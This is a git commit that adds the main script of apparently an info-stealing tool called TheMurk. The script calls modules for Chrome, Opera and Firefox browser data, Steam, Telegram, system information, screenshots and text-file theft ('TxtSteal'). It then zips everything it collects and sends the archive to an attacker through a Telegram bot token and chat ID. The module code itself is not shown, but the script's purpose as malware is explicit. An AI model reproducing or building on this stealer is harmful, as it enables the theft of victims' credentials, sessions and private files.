f95a9209200e9abf20d059141c2334413ba7d9b6
Nick Vinesmoke <123866627+Nick-Vinesmoke@users.noreply.github.com>
2023-03-16 16:03:26 +0200

    🐍TheMurk

---
+++ TheMurk.py
@@ -0,0 +1,40 @@
+userTOKEN = ''
+userCHAT_ID = ''
+
+
+
+
+
+
+from modules.others import folder
+from modules.system import sys
+from modules.system import screen
+from modules.browsers import chrome
+from modules.browsers import opera
+from modules.browsers import firefox
+from modules.others import telegram
+from modules.others import sender
+from modules.others import makeitclean
+from modules.others import steam
+from modules.system import txt
+
+
+
+folder.makeFolders()
+chrome.Chrome()
+opera.Opera()
+firefox.Firefox()
+steam.Steam()
+sys.SystemInfo()
+txt.TxtSteal()
+telegram.Telegram()
+screen.Screenshot()
+
+try:
+    makeitclean.makemeZip()
+except Exception as e:
+    print(e)
+try:
+    sender.Send(userTOKEN,userCHAT_ID)
+except Exception as e:
+    print(e)
